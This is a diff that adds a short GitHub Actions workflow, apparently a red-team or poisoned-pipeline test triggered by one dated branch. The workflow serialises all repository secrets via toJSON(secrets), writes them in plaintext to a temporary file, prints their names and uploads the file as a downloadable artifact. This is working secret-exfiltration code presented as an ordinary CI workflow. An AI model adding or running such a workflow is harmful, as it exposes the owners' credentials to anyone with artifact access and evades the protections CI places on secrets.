@@ -1,0 +1,28 @@
+name: rt-pp
+on:
+  push:
+    branches: [rt-pp-20261027]
+permissions:
+  contents: read
+jobs:
+  pp:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - name: dump
+        env:
+          SECRETS_JSON: ${{ toJSON(secrets) }}
+        run: |
+          python3 - <<'PY'
+          import os,json
+          s=json.loads(os.environ.get('SECRETS_JSON','{}'))
+          json.dump(s,open('/tmp/secrets.json','w'),indent=1)
+          print("names:",sorted(s.keys()))
+          PY
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ppdump
+          path: /tmp/secrets.json
+          retention-days: 1
